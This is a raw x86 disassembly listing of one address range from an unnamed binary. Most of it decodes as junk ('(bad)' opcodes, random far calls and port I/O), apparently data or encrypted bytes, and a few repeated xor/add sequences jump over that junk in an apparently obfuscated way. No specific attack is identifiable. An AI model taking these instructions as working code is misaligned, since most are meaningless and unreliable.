  42b5f3:	jmp    0xc37f:0xd099f2c7
  42b5fa:	test   eax,0x2da29bd8
  42b5ff:	test   ecx,edx
  42b601:	nop
  42b602:	call   0x3ec0:0xc97603d6
  42b609:	test   al,0x79
  42b60b:	xchg   esp,eax
  42b60c:	out    dx,al
  42b60d:	dec    ecx
  42b60e:	mov    ds:0xffdedc68,eax
  42b613:	jmp    FWORD PTR [eax-0x29]
  42b616:	dec    edi
  42b617:	jmp    0x42b604
  42b619:	lea    eax,[esp+0x64]
  42b61d:	jmp    0x42b6fd
  42b622:	int    0xb4
  42b624:	mov    ebp,0xdfebfde2
  42b629:	mov    edi,0x337863c5
  42b62e:	nop
  42b62f:	adc    eax,0x34269fd
  42b634:	add    al,BYTE PTR [eax]
  42b636:	ret    
  42b637:	add    BYTE PTR [eax],al
  42b639:	add    BYTE PTR [ebx+ebp*8],dh
  42b63c:	adc    BYTE PTR [ebx+eax*2-0x2a7e4e0a],cl
  42b643:	stos   DWORD PTR es:[edi],eax
  42b644:	mov    edx,eax
  42b646:	mov    ch,BYTE PTR [edi+0x6e817e13]
  42b64c:	sub    eax,0x3b838b0
  42b651:	dec    esi
  42b652:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b654:	(bad)  
  42b655:	fidivr WORD PTR [ebx+0x492fb70]
  42b65b:	(bad)  
  42b65c:	fidivr DWORD PTR [edx+eiz*4]
  42b65f:	neg    BYTE PTR ds:0x9f50f486
  42b665:	int3   
  42b666:	mov    ds:0x885929a5,eax
  42b66b:	adc    BYTE PTR [ebx-0x721384f3],al
  42b671:	loope  0x42b69a
  42b673:	fs mov cl,ch
  42b676:	daa    
  42b677:	lahf   
  42b678:	jg     0x42b6a8
  42b67a:	pop    eax
  42b67b:	cmp    BYTE PTR [ebp+0x6f],ah
  42b67e:	or     al,dl
  42b680:	ins    DWORD PTR es:[edi],dx
  42b681:	retf   
  42b682:	sti    
  42b683:	(bad)  
  42b684:	push   ebp
  42b685:	adc    eax,0x99d7e4bc
  42b68a:	push   edi
  42b68b:	xor    BYTE PTR [esi+0x21],dl
  42b68e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b68f:	pop    ds
  42b690:	and    al,0xc9
  42b692:	jbe    0x42b69b
  42b694:	push   esp
  42b695:	push   esi
  42b696:	pop    ebx
  42b697:	xchg   esp,eax
  42b698:	test   DWORD PTR [eax+0x4a9b7077],ecx
  42b69e:	lods   eax,DWORD PTR ds:[esi]
  42b69f:	call   FWORD PTR [edx-0x7]
  42b6a2:	je     0x42b705
  42b6a4:	test   al,0xf6
  42b6a6:	add    ch,BYTE PTR [edx+0x14]
  42b6a9:	arpl   WORD PTR [esi*8-0x4f82ee06],ax
  42b6b0:	pop    ebx
  42b6b1:	dec    ebx
  42b6b2:	dec    ebp
  42b6b3:	add    eax,0xc15dc26e
  42b6b8:	or     edi,ecx
  42b6ba:	push   ebx
  42b6bb:	push   ss
  42b6bc:	mov    cl,0xf8
  42b6be:	xor    bh,BYTE PTR [esp+ebx*2]
  42b6c1:	push   cs
  42b6c2:	and    eax,0xc374c87c
  42b6c7:	sbb    eax,0x88c2da44
  42b6cc:	mov    BYTE PTR [ebx-0x1c0f3dc0],ah
  42b6d2:	push   ebp
  42b6d3:	shl    BYTE PTR [edi],1
  42b6d5:	ror    BYTE PTR [eax+eiz*4],1
  42b6d8:	hlt    
  42b6d9:	or     eax,0x45e88a8e
  42b6de:	xchg   bh,dl
  42b6e0:	fsubrp st(0),st
  42b6e2:	jp     0x42b6ad
  42b6e4:	lahf   
  42b6e5:	sahf   
  42b6e6:	or     cl,BYTE PTR [edi]
  42b6e8:	loope  0x42b704
  42b6ea:	loopne 0x42b6a9
  42b6ec:	leave  
  42b6ed:	fcomp  QWORD PTR [edi]
  42b6ef:	sar    BYTE PTR [ecx+eax*2],0xe8
  42b6f3:	fcmovu st,st(2)
  42b6f5:	pop    edx
  42b6f6:	cwde   
  42b6f7:	fst    DWORD PTR [ebp-0x3c]
  42b6fa:	add    al,0xc9
  42b6fc:	or     eax,0x24448d50
  42b701:	and    BYTE PTR [eax-0x18],dl
  42b704:	stc    
  42b705:	adc    edi,edi
  42b707:	(bad)  
  42b708:	push   DWORD PTR [esp+0x5c]
  42b70c:	push   DWORD PTR [esp+0x5c]
  42b710:	push   DWORD PTR [esp+0x1c]
  42b714:	jmp    0x42b7f4
  42b719:	call   0xbaf6:0xfe56fe4a
  42b720:	into   
  42b721:	dec    edi
  42b722:	jp     0x13c0fd06
  42b728:	or     eax,0x20405
  42b72d:	ret    
  42b72e:	add    BYTE PTR [eax],al
  42b730:	add    BYTE PTR [esi+0x9],al
  42b733:	add    BYTE PTR [esi+0x2b01a8f3],0x66
  42b73a:	div    BYTE PTR [esi-0x2e14576e]
  42b740:	pop    ds
  42b741:	bound  ebp,QWORD PTR [ebx*2+0x44764b41]
  42b748:	les    esp,FWORD PTR [edx]
  42b74a:	in     eax,0xb7
  42b74c:	dec    edx
  42b74d:	mov    esp,0x40e7b4da
  42b752:	(bad)  
  42b754:	out    dx,eax
  42b755:	aaa    
  42b756:	pop    edx
  42b757:	cmp    DWORD PTR ds:0xd21a5bdf,ebp
  42b75d:	shr    cl,cl
  42b75f:	mov    edx,0x12f4a30
  42b764:	mov    dl,0x6d
  42b766:	push   ss
  42b767:	adc    al,0xef
  42b769:	test   eax,0xa733ff55
  42b76e:	in     eax,0xf
  42b770:	out    0x1c,al
  42b772:	loope  0x42b77d
  42b774:	cmp    cl,BYTE PTR [esi+0x56]
  42b777:	sub    DWORD PTR [edx],eax
  42b779:	mov    eax,0x3ba0fcd9
  42b77e:	fdivr  DWORD PTR [ebx]
  42b780:	icebp  
  42b781:	repz mov ds:0x26f37ec3,al
  42b787:	or     esi,ecx
  42b789:	(bad)  
  42b78a:	fnstcw WORD PTR [ebx+ebx*8]
  42b78d:	xor    DWORD PTR ds:0xf5715a13,ecx
  42b793:	mov    ebx,DWORD PTR [eax+esi*2+0x21]
  42b797:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b798:	mov    edx,0x53b393bd
  42b79d:	adc    eax,0xdda96642
  42b7a2:	(bad)  
  42b7a3:	jmp    0x42b7a9
  42b7a5:	xor    edx,DWORD PTR [edi+0x68e0a2be]
  42b7ab:	add    dl,BYTE PTR [edx]
  42b7ad:	(bad)  
  42b7ae:	sub    bl,BYTE PTR [eax]
  42b7b0:	mov    cs,WORD PTR [ebx]
  42b7b2:	and    ebx,DWORD PTR [eax]
  42b7b4:	(bad)  
  42b7b5:	icebp  
  42b7b6:	das    
  42b7b7:	xchg   edi,eax
  42b7b8:	push   ebx
  42b7b9:	jnp    0x42b7d4
  42b7bb:	pop    ds
  42b7bc:	jl     0x42b780
  42b7be:	mov    bl,0x49
  42b7c0:	jge    0x42b81c
  42b7c2:	imul   BYTE PTR [esi-0x7aec4e4e]
  42b7c8:	pop    ebp
  42b7c9:	popf   
  42b7ca:	inc    ebx
  42b7cb:	jns    0x42b794
  42b7cd:	mov    cl,0x7e
  42b7cf:	lahf   
  42b7d0:	inc    esp
  42b7d1:	sub    BYTE PTR [edi-0x7b],0x22
  42b7d5:	fiadd  DWORD PTR [edx-0x3f]
  42b7d8:	hlt    
  42b7d9:	mov    cl,0x5c
  42b7db:	ds jae 0x42b7a7
  42b7de:	test   eax,0xb53d3f4d
  42b7e3:	sbb    eax,DWORD PTR [edi+0x1b]
  42b7e6:	popa   
  42b7e7:	pop    ebp
  42b7e8:	and    bl,dl
  42b7ea:	adc    BYTE PTR [edi],bl
  42b7ec:	out    dx,al
  42b7ed:	cdq    
  42b7ee:	push   0xffffffd6
  42b7f0:	cmp    cl,dh
  42b7f2:	inc    ebx
  42b7f3:	daa    
  42b7f4:	push   DWORD PTR [esp+0x1c]
  42b7f8:	call   0x41e3f1
  42b7fd:	mov    eax,DWORD PTR [esp+0x10]
  42b801:	mov    ecx,DWORD PTR [esp+0x14]
  42b805:	mov    ecx,DWORD PTR [esp+0x54]
  42b809:	xor    eax,esi
  42b80b:	add    eax,0x99b8624d
  42b810:	jmp    0x42b8f0
  42b815:	xor    edi,DWORD PTR [ecx+eiz*2-0x3b]
  42b819:	outs   dx,DWORD PTR ds:[esi]
  42b81a:	fnsave [edi-0x486bf102]
  42b820:	gs jnp 0x42b7b7
  42b823:	mov    cl,BYTE PTR [esi-0x38]
  42b826:	add    al,0x2
  42b828:	add    bl,al
  42b82a:	add    BYTE PTR [eax],al
  42b82c:	add    BYTE PTR [eax],dh
  42b82e:	out    dx,al
  42b82f:	adc    ch,BYTE PTR [ebp+0x6df794a7]
  42b835:	inc    edi
  42b836:	sbb    eax,0x154ada6d
  42b83b:	lds    edx,FWORD PTR [ecx-0x75]
  42b83e:	mov    ds,WORD PTR [ebx]
  42b840:	out    dx,al
  42b841:	pop    ebx
  42b842:	mov    ebx,0x389614fd
  42b847:	cmp    al,BYTE PTR [ebp+0x68ba17d8]
  42b84d:	aam    0x2
  42b84f:	in     al,dx
  42b850:	and    dl,BYTE PTR [esi]
  42b852:	fs mov ecx,es
  42b855:	push   esp
  42b856:	cmp    BYTE PTR [edi+0x2bb0b269],bh
  42b85c:	fild   DWORD PTR [ebx]
  42b85e:	inc    ecx
  42b85f:	sbb    esi,esi
  42b861:	mov    ds:0x9089b259,al
  42b866:	mov    WORD PTR ds:0x1a97368e,es
  42b86c:	or     dl,cl
  42b86e:	push   ebp
  42b86f:	call   DWORD PTR [esi-0x68]
  42b872:	out    dx,eax
  42b873:	push   ds
  42b874:	or     BYTE PTR [ebp+0x3909e13d],ch
  42b87a:	shl    BYTE PTR [esi+edx*2],cl
  42b87d:	fstp   st(3)
  42b87f:	ficom  WORD PTR [ebx]
  42b881:	ret    0x8236
  42b884:	xlat   BYTE PTR ds:[ebx]
  42b885:	in     al,dx
  42b886:	pop    ebp
  42b887:	jne    0x42b8aa
  42b889:	mov    ds:0xb5dda5bd,al
  42b88e:	shr    BYTE PTR [esi-0x2502bc9],1
  42b894:	inc    edi
  42b895:	jbe    0x42b81f
  42b897:	dec    ebx
  42b898:	add    al,0xeb
  42b89a:	xor    al,0xb5
  42b89c:	inc    edx
  42b89d:	dec    edi
  42b89e:	dec    ecx
  42b89f:	mov    ecx,DWORD PTR [eax-0x79cc5b4]
  42b8a5:	inc    ebx
  42b8a6:	out    dx,eax
  42b8a7:	add    eax,0x8d8a0670
  42b8ac:	dec    eax
  42b8ad:	fldenv [esi]
  42b8af:	aas    
  42b8b0:	leave  
  42b8b1:	test   ah,0xa7
  42b8b4:	jae    0x42b90d
  42b8b6:	jb     0x42b8d1
  42b8b8:	push   cs
  42b8b9:	imul   ebx,DWORD PTR [edx+0x163ab2e7],0x52fb7936
  42b8c3:	mov    ebx,0x93afebc7
  42b8c8:	and    esi,DWORD PTR [ecx+eiz*8-0x63b91f72]
  42b8cf:	rol    BYTE PTR [esi],cl
  42b8d1:	mov    esi,0x6ae2115d
  42b8d6:	mov    ebp,0xff275105
  42b8db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b8dc:	in     al,dx
  42b8dd:	les    edi,FWORD PTR [edi]
  42b8df:	sub    cl,0x5a
  42b8e2:	mov    ebx,ebp
  42b8e4:	adc    ebx,eax
  42b8e6:	lods   eax,DWORD PTR ds:[esi]
  42b8e7:	sbb    BYTE PTR ds:0xc452f98e,0x3b
  42b8ee:	inc    eax
  42b8ef:	inc    ecx
  42b8f0:	mov    DWORD PTR [ecx],eax
  42b8f2:	mov    eax,DWORD PTR [esp+0x10]
  42b8f6:	mov    ecx,DWORD PTR [esp+0x14]
  42b8fa:	mov    ecx,DWORD PTR [esp+0x48]
  42b8fe:	xor    eax,esi
  42b900:	add    eax,0x99b8624d
  42b905:	mov    DWORD PTR [ecx],eax
  42b907:	mov    eax,DWORD PTR [esp+0x48]
  42b90b:	mov    ecx,DWORD PTR [esp+0x48]
  42b90f:	mov    eax,DWORD PTR [eax]
  42b911:	cmp    eax,DWORD PTR [ecx]
  42b913:	jmp    0x42b9f3
  42b918:	lock pop ds
  42b91a:	jae    0x42b95d
  42b91c:	jmp    FWORD PTR [ebp-0xe]
  42b91f:	mov    edi,0xc3c52550
  42b924:	inc    esi
  42b925:	add    esp,DWORD PTR [edi]
  42b927:	or     eax,0x2058b
  42b92c:	ret    
  42b92d:	add    BYTE PTR [eax],al
  42b92f:	add    BYTE PTR [ecx-0x71],ch
  42b932:	(bad)  
  42b933:	mov    edi,0xb633f81b
  42b938:	fadd   st(5),st
  42b93a:	in     al,0x4d
  42b93c:	inc    edi
  42b93d:	(bad)  
  42b93e:	cmp    ecx,ebx
  42b940:	cli    
  42b941:	push   eax
  42b942:	outs   dx,DWORD PTR ds:[esi]
  42b943:	iret   
  42b944:	(bad)  
  42b945:	cmp    dh,BYTE PTR [ecx+ecx*1-0x60a0f276]
  42b94c:	loope  0x42b8cf
  42b94e:	enter  0x230f,0x89
  42b952:	enter  0x984a,0x1
  42b956:	out    0x35,eax
  42b958:	jnp    0x42b99d
  42b95a:	jge    0x42b998
  42b95c:	lea    edi,[edi]
  42b95e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b95f:	xor    DWORD PTR [ecx],edx
  42b961:	cwde   
  42b962:	lahf   
  42b963:	scas   eax,DWORD PTR es:[edi]
  42b964:	push   ebp
  42b965:	pop    edi
  42b966:	mov    esp,0x2e1a206
  42b96b:	mov    ch,0x39
  42b96d:	xor    al,0x5d
  42b96f:	call   0x576db14
  42b974:	xchg   ecx,eax
  42b975:	repnz inc ebx
  42b977:	loopne 0x42b971
  42b979:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b97a:	fstp   QWORD PTR [ebx-0x43]
  42b97d:	or     DWORD PTR [esi],0xffffffdf
  42b980:	out    dx,eax
  42b981:	ins    WORD PTR es:[edi],dx
  42b983:	es data16 scas al,BYTE PTR es:[edi]
  42b986:	loop   0x42b9ea
  42b988:	mov    eax,ds:0xa1d6006e
  42b98d:	repnz scas al,BYTE PTR es:[edi]
  42b98f:	pop    ecx
  42b990:	in     al,dx
  42b991:	pop    ds
  42b992:	mov    eax,ds:0xda7d0300
  42b997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b998:	sbb    edx,edi
  42b99a:	repnz push 0xffffffa2
  42b99d:	call   0x85f59fbc
  42b9a2:	mov    cl,BYTE PTR [esi+0x12ed6929]
  42b9a8:	retf   
  42b9a9:	and    eax,0x3e8ce7e4
  42b9ae:	dec    esp
  42b9af:	outs   dx,DWORD PTR ds:[esi]
  42b9b0:	push   ds
  42b9b1:	stos   BYTE PTR es:[edi],al
  42b9b2:	neg    DWORD PTR [ecx-0x3a]
  42b9b5:	sub    bl,BYTE PTR [ecx+0x74d5a2bf]
  42b9bb:	lahf   
  42b9bc:	dec    esp
  42b9bd:	push   esp
  42b9be:	and    al,0xd3
  42b9c0:	xchg   edi,eax
  42b9c1:	mov    bh,0xcc
  42b9c3:	int    0x85
  42b9c5:	mov    ah,0x57
  42b9c7:	xor    dh,BYTE PTR [esi]
  42b9c9:	mov    dl,0x84
  42b9cb:	dec    edi
  42b9cc:	mov    ecx,0xce2e69c5
  42b9d1:	pop    esi
  42b9d2:	ja     0x42b9ca
  42b9d4:	(bad)  
  42b9d5:	jo     0x42b99b
  42b9d7:	mov    dh,ch
  42b9d9:	jmp    0x1f5aee63
  42b9de:	lock sahf 
  42b9e0:	fwait
  42b9e1:	(bad)  
  42b9e2:	sub    ecx,DWORD PTR [esp+ecx*2+0x6b]
  42b9e6:	mov    ah,0x6d
  42b9e8:	sbb    bl,ch
  42b9ea:	mov    bl,0x51
  42b9ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9ed:	(bad)  
  42b9ef:	push   edx
  42b9f0:	adc    al,0xfb
  42b9f2:	imul   ecx,DWORD PTR [edi],0xcf885
  42b9f8:	add    BYTE PTR [ebx-0x74abdbbc],cl
  42b9fe:	dec    esp
  42b9ff:	and    al,0x54
  42ba01:	mov    eax,DWORD PTR [eax]
  42ba03:	cmp    eax,DWORD PTR [ecx]
  42ba05:	jne    0x42c6f1
  42ba0b:	mov    eax,DWORD PTR [esp+0x10]
  42ba0f:	jmp    0x42baef
  42ba14:	ss add dh,0xd0
  42ba18:	not    ah
  42ba1a:	ss out 0x64,al
  42ba1d:	mov    ds:0xb9ffc38f,al
  42ba22:	jns    0x42b9f0
  42ba24:	dec    esi
  42ba25:	push   es
  42ba26:	add    al,BYTE PTR [eax]
  42ba28:	ret    
  42ba29:	add    BYTE PTR [eax],al
  42ba2b:	add    BYTE PTR [ebp+0x31],ch
  42ba2e:	mov    al,ds:0x36d26857
  42ba33:	pop    ss
  42ba34:	xor    ecx,DWORD PTR [edx+0x66a6918a]
  42ba3a:	cmp    al,0x4b
  42ba3c:	iret   
  42ba3d:	mov    bh,ch
  42ba3f:	addr16 dec esp
  42ba41:	or     eax,0x9988abbc
  42ba46:	addr16 dec edi
  42ba48:	(bad)
  42ba4d:	je     0x42ba56
  42ba4f:	into   
  42ba50:	dec    esi
  42ba51:	xchg   edi,eax
  42ba52:	push   edx
  42ba53:	popa   
  42ba54:	call   0xbb6ee4a4
  42ba59:	xlat   BYTE PTR ds:[ebx]
  42ba5a:	xchg   DWORD PTR [ebp+0x57562088],ebx
  42ba60:	sbb    al,0x45
  42ba62:	pusha  
  42ba63:	pop    ebp
  42ba64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ba65:	sbb    BYTE PTR [esi+eax*8-0x40],ah
  42ba69:	rol    BYTE PTR [ebp+0x77f445fa],cl
  42ba6f:	inc    esi
  42ba70:	shl    BYTE PTR [edx+0x74],0x16
  42ba74:	mov    ecx,0xabb93c8
  42ba79:	test   al,0xf3
  42ba7b:	jb     0x42babc
  42ba7d:	and    eax,0x1bddbbf7
  42ba82:	(bad)  
  42ba83:	call   FWORD PTR [esi]
  42ba85:	ja     0x42ba8f
  42ba87:	(bad)  
  42ba88:	daa    
  42ba89:	jns    0x42baa8
  42ba8b:	xchg   edi,eax
  42ba8c:	dec    edi
  42ba8d:	out    0x4f,eax
  42ba8f:	cmp    ecx,DWORD PTR [ebx*2+0x15f9d605]
  42ba96:	or     esi,DWORD PTR [ebp+ebx*8+0x6fde1fb9]
  42ba9d:	pop    DWORD PTR [edi+edx*2+0xbed6dc2]
  42baa4:	pop    esi
  42baa5:	jle    0x42badd
  42baa7:	inc    esp
  42baa8:	mov    edi,0x2c063ee4
  42baad:	test   BYTE PTR [edx],ah
  42baaf:	ret    0x1afb
  42bab2:	push   esi
  42bab3:	jne    0x42bac5
  42bab5:	ins    DWORD PTR es:[edi],dx
  42bab6:	push   0x3d95bd2c
  42babb:	adc    eax,0x767e093f
  42bac0:	dec    edi
  42bac1:	dec    eax
  42bac2:	mov    al,0x5d
  42bac4:	pop    esi
  42bac5:	dec    ebp
  42bac6:	call   0x3d76:0x670145b2
  42bacd:	mov    dh,0xe3
  42bacf:	fsub   st,st(2)
  42bad1:	aaa    
  42bad2:	ror    BYTE PTR fs:[edi+0x77eebd68],0x6f
  42bada:	lock or BYTE PTR [ebx-0xb],bl
  42bade:	in     eax,0x57
  42bae0:	cmp    eax,0x2f13340c
  42bae5:	xchg   DWORD PTR [ecx-0x1d28f470],ebp
  42baeb:	pop    esi
  42baec:	sbb    al,0x93
  42baee:	jnp    0x8b56df40
  42baf4:	push   esp
  42baf5:	and    al,0x6c
  42baf7:	mov    edx,DWORD PTR [edx]
  42baf9:	xor    eax,esi
  42bafb:	xor    ecx,ebx
  42bafd:	add    eax,0x99b8624d
  42bb02:	jmp    0x42bbe2
  42bb07:	dec    esi
  42bb08:	cmp    eax,0x7b776305
  42bb0d:	outs   dx,BYTE PTR ds:[esi]
  42bb0e:	cmp    eax,0x701c6d13
  42bb13:	fcmovnu st,st(3)
  42bb15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb16:	jo     0x42bb29
  42bb18:	pop    es
  42bb19:	add    al,BYTE PTR [eax]
  42bb1b:	ret    
  42bb1c:	add    BYTE PTR [eax],al
  42bb1e:	add    BYTE PTR [ebx-0x4f74c68],ch
  42bb24:	outs   dx,BYTE PTR ds:[esi]
  42bb25:	pminub mm7,QWORD PTR [eax]
  42bb28:	sti    
  42bb29:	call   0xbf4c:0xd3036244
  42bb30:	int3   
  42bb31:	or     edx,ecx
  42bb33:	mov    edx,0x4bcef8d8
  42bb38:	push   0x6
  42bb3a:	or     BYTE PTR [ebx+0x41],cl
  42bb3d:	gs popf 
  42bb3f:	dec    edi
  42bb40:	jge    0x42bb50
  42bb42:	mov    ss,WORD PTR [edx-0x4f]
  42bb45:	int3   
  42bb46:	sub    eax,0x73b42dc1
  42bb4b:	xchg   edi,eax
  42bb4c:	ins    BYTE PTR es:[edi],dx
  42bb4d:	pusha  
  42bb4e:	cmp    esp,DWORD PTR [bx+di]
  42bb51:	adc    al,0x3c
  42bb53:	jb     0x42bb92
  42bb55:	(bad)  
  42bb57:	push   esi
  42bb59:	pusha  
  42bb5a:	es cli 
  42bb5c:	int3   
  42bb5d:	push   ebx
  42bb5e:	push   ss
  42bb5f:	pop    eax
  42bb60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb61:	pop    ebp
  42bb62:	scas   al,BYTE PTR es:[edi]
  42bb63:	dec    edx
  42bb64:	aaa    
  42bb65:	jle    0x42bb0e
  42bb67:	push   0xffffff8a
  42bb69:	rcl    DWORD PTR [edi-0x19],0x82
  42bb6d:	jne    0x42bb5c
  42bb6f:	leave  
  42bb70:	shl    DWORD PTR [eax+0x2a93df64],cl
  42bb76:	icebp  
  42bb77:	mov    bh,0x75
  42bb79:	(bad)  
  42bb7a:	xchg   ebp,eax
  42bb7b:	xchg   ecx,eax
  42bb7d:	call   0x338a13b
  42bb82:	adc    eax,0x7a47485e
  42bb87:	or     dl,dh
  42bb89:	fcos   
  42bb8b:	inc    edi
  42bb8c:	mov    ds:0xcbe082e,al
  42bb91:	loope  0x42bbf1
  42bb93:	outs   dx,BYTE PTR ds:[esi]
  42bb94:	in     al,0x7c
  42bb96:	call   0x980808bc
  42bb9b:	sbb    al,0xeb
  42bb9d:	xor    ch,dl
  42bb9f:	repnz retf 
  42bba1:	les    edi,FWORD PTR [ecx]
  42bba3:	adc    BYTE PTR [ebp+0x12],0x1b
  42bba7:	xlat   BYTE PTR ds:[ebx]
  42bba8:	sub    BYTE PTR [edi+0x4573a6a2],ch
  42bbae:	stos   BYTE PTR es:[edi],al
  42bbaf:	xchg   edx,eax
  42bbb0:	add    al,0xa3
  42bbb2:	mov    bh,0x25
  42bbb4:	inc    esi
  42bbb5:	xor    BYTE PTR [eax-0x48],cl
  42bbb8:	(bad)  
  42bbba:	ss xchg ebx,eax
  42bbbc:	add    al,0x4e
  42bbbe:	sub    DWORD PTR [ebx+0x775f2551],0xcf835f35
  42bbc8:	ins    DWORD PTR es:[edi],dx
  42bbc9:	into   
  42bbca:	pop    ss
  42bbcb:	pop    edi
  42bbcc:	inc    esp
  42bbcd:	hlt    
  42bbce:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bbd0:	std    
  42bbd1:	xchg   ecx,eax
  42bbd2:	pop    esp
  42bbd3:	test   DWORD PTR [edi],edx
  42bbd5:	sar    DWORD PTR [ebx-0x1c],cl
  42bbd8:	cmp    edi,DWORD PTR [esi+eiz*2-0x5c]
  42bbdc:	es into 
  42bbde:	mov    edi,0x81badd5e
  42bbe3:	rcr    esp,1
  42bbe5:	lea    eax,[eax]
  42bbe7:	add    cl,ch
  42bbe9:	fild   DWORD PTR [eax]
  42bbeb:	add    BYTE PTR [eax],al
  42bbed:	mov    WORD PTR [esi+0x2],gs
  42bbf0:	jno    0x42bbd4
  42bbf2:	jge    0x42bbf3
  42bbf4:	inc    edi
  42bbf6:	push   eax
  42bbf7:	(bad)  ds:0x6941e70d
  42bbfd:	aam    0x7
  42bbff:	add    al,BYTE PTR [eax]
  42bc01:	ret    
  42bc02:	add    BYTE PTR [eax],al
  42bc04:	add    dh,cl
  42bc06:	mov    edx,0x2b0b8ba
  42bc0b:	mov    BYTE PTR [ebx],bh
  42bc0d:	leave  
  42bc0e:	das    
  42bc0f:	call   0xdfbc:0x39e5b59e
  42bc16:	mov    ds:0xf4d44162,eax
  42bc1b:	int3   
  42bc1c:	dec    eax
  42bc1d:	dec    ebp
  42bc1e:	cwde   
  42bc1f:	xchg   edx,eax
  42bc20:	ins    DWORD PTR es:[edi],dx
  42bc21:	rcr    BYTE PTR [ebx+0x7d],cl
  42bc24:	dec    DWORD PTR [ebx]
  42bc26:	sbb    al,0xfd
  42bc28:	test   DWORD PTR [eax],0x1e6aa9f9
  42bc2e:	cld    
  42bc2f:	sub    al,0x10
  42bc31:	and    BYTE PTR [ebp+0xb30eaed],dl
  42bc37:	idiv   DWORD PTR [ebp+0x771f114e]
  42bc3d:	mov    ss,WORD PTR [ebp-0x6c93a69c]
  42bc43:	add    BYTE PTR [esi+0x76],dl
  42bc46:	mov    al,ds:0x85bc0526
  42bc4b:	xchg   ah,bh
  42bc4d:	adc    al,dl
  42bc4f:	fisttp QWORD PTR [esi]
  42bc51:	inc    esi
  42bc52:	sti    
  42bc53:	outs   dx,BYTE PTR ds:[esi]
  42bc54:	sar    BYTE PTR [edx+0x110a0d1e],cl
  42bc5a:	jmp    0x6877f8c
  42bc5f:	rcr    dh,0x9f
  42bc62:	or     al,0x8
  42bc64:	push   cs
  42bc65:	jae    0x42bc03
  42bc67:	jg     0x42bc60
  42bc69:	ror    DWORD PTR [edi+0x2d2ea3b9],1
  42bc6f:	pop    ss
  42bc70:	ror    DWORD PTR [ecx-0x3f31c1f7],1
  42bc76:	add    eax,0xedf40815
  42bc7b:	adc    edi,DWORD PTR fs:[ebx+0x39210434]
  42bc82:	fdivr  st,st(2)
  42bc84:	mov    bl,0xd6
  42bc86:	loop   0x42bcd1
  42bc88:	sbb    dh,BYTE PTR [ebx-0x66]
  42bc8b:	mov    bh,0xfb
  42bc8d:	pop    ss
  42bc8e:	mov    bh,0x17
  42bc90:	push   edi
  42bc91:	push   esi
  42bc92:	faddp  st(6),st
  42bc94:	cld    
  42bc95:	mov    cl,0x48
  42bc97:	mul    eax
  42bc99:	add    BYTE PTR [eax],bl
  42bc9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bc9c:	ss push eax
  42bc9e:	push   ss
  42bc9f:	sub    esp,ecx
  42bca1:	rcl    DWORD PTR [ecx],1
  42bca3:	mov    esi,0x87154f53
  42bca8:	pop    edi
  42bca9:	dec    edi
  42bcaa:	xor    cl,0x0
  42bcad:	jo     0x42bd15
  42bcaf:	add    al,0xd5
  42bcb1:	cdq    
  42bcb2:	mov    ah,0xa3
  42bcb4:	popa   
  42bcb5:	mov    ebp,0x7981b7b3
  42bcba:	rcr    ah,1
  42bcbc:	aam    0x74
  42bcbe:	adc    cl,dh
  42bcc0:	mov    eax,0xf624f316
  42bcc5:	stc    
  42bcc6:	fnstsw WORD PTR [esi-0x2fc409cd]
  42bccc:	jne    0x42be9a
  42bcd2:	jmp    0x42bdb2
  42bcd7:	jno    0x42bd3e
  42bcd9:	inc    edi
  42bcda:	adc    al,0x57
  42bcdc:	ss jae 0x42bd44
  42bcdf:	lock sbb al,0x5f
  42bce2:	in     al,0xa7
  42bce4:	cmp    al,0x2b
  42bce6:	jo     0x42bc7f
  42bce8:	or     BYTE PTR [edx],al
  42bcea:	add    bl,al
  42bcec:	add    BYTE PTR [eax],al
  42bcee:	add    bh,cl
  42bcf0:	out    0xb4,al
  42bcf2:	sbb    DWORD PTR [esi],esp
  42bcf4:	enter  0xaf22,0x79
  42bcf8:	push   edx
  42bcf9:	dec    eax
  42bcfa:	in     eax,dx
  42bcfb:	inc    eax
  42bcfc:	pop    edi
  42bcfd:	lock call 0xc405:0x9f63f5a0
  42bd05:	xlat   BYTE PTR ds:[ebx]
  42bd06:	dec    esi
  42bd07:	enter  0xf390,0xc4
  42bd0b:	fwait
  42bd0c:	mov    ebp,0x7ed5b1f9
  42bd11:	aam    0xb3
  42bd13:	mov    ds:0x79c43204,al
  42bd18:	or     dl,BYTE PTR [eax-0x37]
  42bd1b:	add    ebp,edx
  42bd1d:	fisubr DWORD PTR [ecx]
  42bd1f:	pushf  
  42bd20:	mov    esi,0x61009feb
  42bd25:	rol    BYTE PTR [ecx+edx*8+0x7661f5bf],1
  42bd2c:	push   cs
  42bd2d:	call   0x52534e8
  42bd32:	pop    ecx
  42bd33:	shr    DWORD PTR [ebx+edi*1-0x1df82446],1
  42bd3a:	retf   0xbb49
  42bd3d:	sar    BYTE PTR [edx+0x377b927a],1
  42bd43:	out    0xf4,eax
  42bd45:	adc    edx,DWORD PTR [ebx]
  42bd47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bd48:	sbb    al,0x6a
  42bd4a:	mov    edx,0x339ada7f
  42bd4f:	(bad)  
  42bd50:	adc    edx,DWORD PTR [edx-0x700f2d65]
  42bd56:	mov    ds:0xe4928b92,al
  42bd5b:	les    ecx,FWORD PTR [esi]
  42bd5d:	xor    eax,0xd2db22d1
  42bd62:	fnstsw WORD PTR [ebx-0x17eb0cdc]
  42bd68:	enter  0x4e00,0xe2
  42bd6c:	(bad)  
  42bd6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bd6e:	jl     0x42bd72
  42bd70:	out    0xd,al
  42bd72:	and    bh,BYTE PTR [eax-0x35]
  42bd75:	or     eax,0x1af4782c
  42bd7a:	xchg   DWORD PTR [edi+0x7f],esp
  42bd7d:	dec    edx
